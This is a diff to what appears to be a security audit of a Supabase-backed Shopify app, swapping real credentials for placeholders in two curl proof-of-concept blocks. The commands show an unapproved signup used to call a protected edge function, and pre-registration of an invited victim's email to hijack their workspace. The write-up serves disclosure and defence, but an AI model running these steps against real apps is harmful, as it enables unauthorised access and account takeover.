@@ -71,7 +71,7 @@ curl -s -X POST "https://<ref>.supabase.co/functions/v1/shopify-titles" \
 # 3. Option B — guaranteed to work even if verify_jwt rejects the anon key:
 #    sign up (open to anyone), do NOT get approved, and call with the user JWT.
 curl -s -X POST "https://<ref>.supabase.co/auth/v1/signup" -H "apikey: $ANON_KEY" \
-  -H "content-type: application/json" -d '{"email":"throwaway@mailinator.com","password":"hunter22"}'
+  -H "content-type: application/json" -d '{"email":"<attacker-email>","password":"<attacker-password>"}'
 curl -s -X POST "https://<ref>.supabase.co/functions/v1/shopify-titles" \
   -H "Authorization: Bearer $USER_JWT" -H "apikey: $ANON_KEY" -d '{}'
 ```
@@ -178,7 +178,7 @@ returned session):
 # Attacker learns that ops@bigvintageshop.com was invited (guessable, or leaked in a screenshot).
 curl -X POST "https://<ref>.supabase.co/auth/v1/signup" -H "apikey: $ANON_KEY" \
   -H "content-type: application/json" \
-  -d '{"email":"ops@bigvintageshop.com","password":"Pa55w0rd!"}'
+  -d '{"email":"<victim-email>","password":"<attacker-chosen-password>"}'
 # Sign in, then the app's own bootstrap joins the victim's workspace for you:
 #   orgService.ts:97-124  -> org_invites SELECT (RLS: email match) -> org_members INSERT
 ```
